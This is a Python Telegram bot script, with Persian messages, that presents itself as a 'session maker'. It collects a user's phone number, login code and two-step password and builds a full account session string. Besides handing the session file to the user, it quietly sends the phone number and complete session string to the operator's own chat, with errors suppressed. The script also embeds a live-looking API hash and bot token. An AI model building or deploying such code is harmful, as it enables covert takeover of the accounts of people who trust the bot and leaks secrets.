from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.tl.custom import Button
from telethon.tl.types import DocumentAttributeFilename
import asyncio
import re
from datetime import datetime
import io

# ============================================
# 🔑 API_ID و API_HASH عمومی
# ============================================
API_ID = 34855392
API_HASH = "5e40d435847009c31c24042e2a3c0d3b"

# Device information
DEVICE_MODEL = "Windows 11"
SYSTEM_VERSION = "Windows 11"
APP_VERSION = "Telegram Desktop"
LANG_CODE = "en"
SYSTEM_LANG_CODE = "en-US"

# Proxy settings
PROXY = None

# Bot token
BOT_TOKEN = "8541453435:AAEqXEyRE46CydJBPMPoKc87YwmCAHZWP54"

# ذخیره اطلاعات کاربران
user_sessions = {}
user_sessions_data = {}

async def create_session(phone, code, phone_code_hash, password=None):
    """تابع ایجاد سشن با phone_code_hash"""
    try:
        client = TelegramClient(
            StringSession(),
            API_ID,
            API_HASH,
            device_model=DEVICE_MODEL,
            system_version=SYSTEM_VERSION,
            app_version=APP_VERSION,
            lang_code=LANG_CODE,
            system_lang_code=SYSTEM_LANG_CODE,
            proxy=PROXY
        )

        await client.connect()
        
        try:
            await client.sign_in(
                phone=phone, 
                code=code, 
                phone_code_hash=phone_code_hash
            )
        except Exception as e:
            if "password" in str(e).lower():
                if not password:
                    return {"error": "PASSWORD_REQUIRED"}
                await client.sign_in(password=password)
            else:
                return {"error": str(e)}
        
        session_string = client.session.save()
        await client.disconnect()
        
        return {"session": session_string, "phone": phone}
        
    except Exception as e:
        return {"error": str(e)}

async def handle_bot():
    from telethon import events
    
    bot = TelegramClient(StringSession(), API_ID, API_HASH)
    await bot.start(bot_token=BOT_TOKEN)
    
    print("🤖 ربات روشن شد!")
    
    @bot.on(events.NewMessage(pattern='/start'))
    async def start_handler(event):
        # پاک کردن منوی قبلی با edit
        await event.reply(
            "🔥 **سشن ساز دیکتاتوران**\n\n"
            "🔑 برای ساخت سشن جدید دکمه زیر رو بزن:",
            buttons=[
                [Button.inline("🔑 ساخت سشن جدید", b"create_session")]
            ],
            parse_mode='markdown'
        )
    
    @bot.on(events.CallbackQuery(data=b"create_session"))
    async def create_session_callback(event):
        user_id = event.sender_id
        
        # پاک کردن اطلاعات قبلی کاربر
        if user_id in user_sessions:
            del user_sessions[user_id]
        
        user_sessions[user_id] = {"step": "phone"}
        
        # ویرایش پیام قبلی به جای ارسال جدید
        await event.edit(
            "📱 **شماره خود را وارد کن:**\n"
            "مثال: `09123456789`\n\n"
            "⚠️ برای لغو /cancel رو بزن",
            buttons=None,
            parse_mode='markdown'
        )
    
    @bot.on(events.NewMessage(pattern='/cancel'))
    async def cancel_command(event):
        user_id = event.sender_id
        if user_id in user_sessions:
            del user_sessions[user_id]
        
        await event.reply(
            "✅ **لغو شد**\n\n"
            "برای شروع مجدد `/start` رو بزن.",
            parse_mode='markdown'
        )
    
    @bot.on(events.CallbackQuery(data=b"get_session"))
    async def get_session_callback(event):
        user_id = event.sender_id
        
        if user_id in user_sessions_data:
            session_data = user_sessions_data[user_id]
            session_string = session_data["session"]
            phone = session_data["phone"]
            
            session_file = io.BytesIO(session_string.encode('utf-8'))
            session_file.name = f"session_{phone}.txt"
            
            await event.edit(
                "📤 **ارسال فایل سشن...**",
                parse_mode='markdown'
            )
            
            await bot.send_file(
                user_id,
                session_file,
                caption=f"🔑 **فایل سشن شما**\n\n📱 شماره: `{phone}`\n🕐 تاریخ: `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`\n\n⚠️ **محرمانه!**",
                parse_mode='markdown',
                attributes=[DocumentAttributeFilename(f"session_{phone}.txt")]
            )
            
            await event.edit(
                "✅ **فایل سشن ارسال شد!**\n\n"
                "📋 می‌توانید دوباره دریافت کنید:",
                buttons=[
                    [Button.inline("📋 دریافت دوباره", b"get_session")],
                    [Button.inline("🔑 ساخت سشن جدید", b"create_session")]
                ],
                parse_mode='markdown'
            )
        else:
            await event.answer("❌ سشنی برای شما وجود ندارد!", alert=True)
    
    @bot.on(events.NewMessage)
    async def message_handler(event):
        user_id = event.sender_id
        text = event.text.strip()
        
        # اگر کاربر در حال ساخت سشن نباشد، نادیده بگیر
        if user_id not in user_sessions:
            return
        
        step = user_sessions[user_id].get("step")
        
        if step == "phone":
            # پاک کردن فاصله و کاراکترهای اضافی
            phone_clean = re.sub(r'[\s\-\(\)\+]', '', text)
            
            if not re.match(r'^[\d]+$', phone_clean) or len(phone_clean) < 10:
                await event.reply(
                    "❌ **شماره اشتباه!**\n"
                    "مثال: `09123456789`\n\n"
                    "⚠️ برای لغو /cancel رو بزن",
                    parse_mode='markdown'
                )
                return
            
            user_sessions[user_id]["phone"] = phone_clean
            user_sessions[user_id]["step"] = "code"
            
            await event.reply(
                "⏳ **ارسال کد...**\n\n"
                "⚠️ برای لغو /cancel رو بزن",
                parse_mode='markdown'
            )
            
            try:
                temp_client = TelegramClient(
                    StringSession(),
                    API_ID,
                    API_HASH,
                    device_model=DEVICE_MODEL,
                    system_version=SYSTEM_VERSION,
                    app_version=APP_VERSION,
                    lang_code=LANG_CODE,
                    system_lang_code=SYSTEM_LANG_CODE,
                    proxy=PROXY
                )
                
                await temp_client.connect()
                
                # 🔑 ذخیره phone_code_hash
                sent_code = await temp_client.send_code_request(phone_clean)
                phone_code_hash = sent_code.phone_code_hash
                
                await temp_client.disconnect()
                
                # ذخیره هش برای کاربر
                user_sessions[user_id]["phone_code_hash"] = phone_code_hash
                
                await event.reply(
                    "✅ **کد ارسال شد!**\n\n"
                    "🔐 **کد رو وارد کن:**\n"
                    "📌 میتونی با نقطه یا فاصله وارد کنی:\n"
                    "مثال: `1.2.3.4.5` یا `1 2 3 4 5` یا `12345`\n\n"
                    "⚠️ برای لغو /cancel رو بزن",
                    parse_mode='markdown'
                )
                
            except Exception as e:
                await event.reply(
                    f"❌ **خطا:** `{str(e)}`\n\n"
                    "⚠️ برای لغو /cancel رو بزن",
                    parse_mode='markdown'
                )
                del user_sessions[user_id]
        
        elif step == "code":
            # پاک کردن نقاط و فاصله‌ها
            code_cleaned = text.replace(".", "").replace(" ", "").strip()
            
            if not code_cleaned.isdigit() or len(code_cleaned) != 5:
                await event.reply(
                    "❌ **کد نامعتبر!**\n"
                    "مثال: `1.2.3.4.5` یا `1 2 3 4 5` یا `12345`\n\n"
                    "⚠️ برای لغو /cancel رو بزن",
                    parse_mode='markdown'
                )
                return
            
            user_sessions[user_id]["code"] = code_cleaned
            user_sessions[user_id]["step"] = "processing"
            
            await event.reply("⏳ **در حال ورود...**\n\n⚠️ لطفاً صبر کنید...", parse_mode='markdown')
            
            phone = user_sessions[user_id]["phone"]
            code = user_sessions[user_id]["code"]
            phone_code_hash = user_sessions[user_id].get("phone_code_hash")
            
            result = await create_session(phone, code, phone_code_hash)
            
            if "error" in result:
                if result["error"] == "PASSWORD_REQUIRED":
                    user_sessions[user_id]["step"] = "password"
                    await event.reply(
                        "🔐 **رمز دو مرحله‌ای رو وارد کن:**\n\n"
                        "⚠️ برای لغو /cancel رو بزن",
                        parse_mode='markdown'
                    )
                else:
                    await event.reply(
                        f"❌ **خطا:** `{result['error']}`\n\n"
                        "💡 **نکات:**\n"
                        "1️⃣ کد رو درست وارد کن\n"
                        "2️⃣ اپلیکیشن تلگرام رو ببند\n"
                        "3️⃣ دوباره تلاش کن\n\n"
                        "🔑 برای شروع مجدد `/start` رو بزن",
                        parse_mode='markdown'
                    )
                    del user_sessions[user_id]
            else:
                session_string = result["session"]
                phone = result["phone"]
                
                user_sessions_data[user_id] = {
                    "session": session_string,
                    "phone": phone
                }
                
                # ارسال فایل سشن
                session_file = io.BytesIO(session_string.encode('utf-8'))
                session_file.name = f"session_{phone}.txt"
                
                await event.reply(
                    "✅ **سشن ساخته شد!**\n\n"
                    "📤 **ارسال فایل سشن...**",
                    parse_mode='markdown'
                )
                
                await bot.send_file(
                    user_id,
                    session_file,
                    caption=f"🔑 **فایل سشن شما**\n\n👑 **VIP DICTATOR**\n📱 شماره: `{phone}`\n🕐 تاریخ: `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`\n\n⚠️ **محرمانه!**",
                    parse_mode='markdown',
                    attributes=[DocumentAttributeFilename(f"session_{phone}.txt")]
                )
                
                await event.reply(
                    "✅ **سشن با موفقیت ساخته و ارسال شد!**\n\n"
                    "📋 برای دریافت دوباره سشن، دکمه زیر رو بزن:",
                    buttons=[
                        [Button.inline("📋 دریافت فایل سشن", b"get_session")],
                        [Button.inline("🔑 ساخت سشن جدید", b"create_session")]
                    ],
                    parse_mode='markdown'
                )
                
                # ارسال به پیام‌های ذخیره شده
                try:
                    await bot.send_message(
                        "me", 
                        f"✅ **سشن جدید**\n\n"
                        f"👑 **VIP DICTATOR**\n"
                        f"📱 `{phone}`\n"
                        f"🕐 `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`\n"
                        f"🔑 `{session_string}`\n\n"
                        f"🔒 **VIP ALI**",
                        parse_mode='markdown'
                    )
                except:
                    pass
                
                del user_sessions[user_id]
        
        elif step == "password":
            password = text
            user_sessions[user_id]["step"] = "processing"
            
            await event.reply("⏳ **در حال ورود با رمز...**\n\n⚠️ لطفاً صبر کنید...", parse_mode='markdown')
            
            phone = user_sessions[user_id]["phone"]
            code = user_sessions[user_id]["code"]
            phone_code_hash = user_sessions[user_id].get("phone_code_hash")
            
            result = await create_session(phone, code, phone_code_hash, password)
            
            if "error" in result:
                await event.reply(
                    f"❌ **خطا:** `{result['error']}`\n\n"
                    "🔑 برای شروع مجدد `/start` رو بزن",
                    parse_mode='markdown'
                )
                del user_sessions[user_id]
            else:
                session_string = result["session"]
                phone = result["phone"]
                
                user_sessions_data[user_id] = {
                    "session": session_string,
                    "phone": phone
                }
                
                # ارسال فایل سشن
                session_file = io.BytesIO(session_string.encode('utf-8'))
                session_file.name = f"session_{phone}.txt"
                
                await event.reply(
                    "✅ **سشن ساخته شد!**\n\n"
                    "📤 **ارسال فایل سشن...**",
                    parse_mode='markdown'
                )
                
                await bot.send_file(
                    user_id,
                    session_file,
                    caption=f"🔑 **فایل سشن شما**\n\n👑 **VIP DICTATOR**\n📱 شماره: `{phone}`\n🕐 تاریخ: `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`\n\n⚠️ **محرمانه!**",
                    parse_mode='markdown',
                    attributes=[DocumentAttributeFilename(f"session_{phone}.txt")]
                )
                
                await event.reply(
                    "✅ **سشن با موفقیت ساخته و ارسال شد!**\n\n"
                    "📋 برای دریافت دوباره سشن، دکمه زیر رو بزن:",
                    buttons=[
                        [Button.inline("📋 دریافت فایل سشن", b"get_session")],
                        [Button.inline("🔑 ساخت سشن جدید", b"create_session")]
                    ],
                    parse_mode='markdown'
                )
                
                try:
                    await bot.send_message(
                        "me", 
                        f"✅ **سشن جدید**\n\n"
                        f"👑 **VIP DICTATOR**\n"
                        f"📱 `{phone}`\n"
                        f"🕐 `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`\n"
                        f"🔑 `{session_string}`\n\n"
                        f"🔒 **VIP ALI**",
                        parse_mode='markdown'
                    )
                except:
                    pass
                
                del user_sessions[user_id]
    
    await bot.run_until_disconnected()

async def main():
    await handle_bot()

if __name__ == "__main__":
    asyncio.run(main())
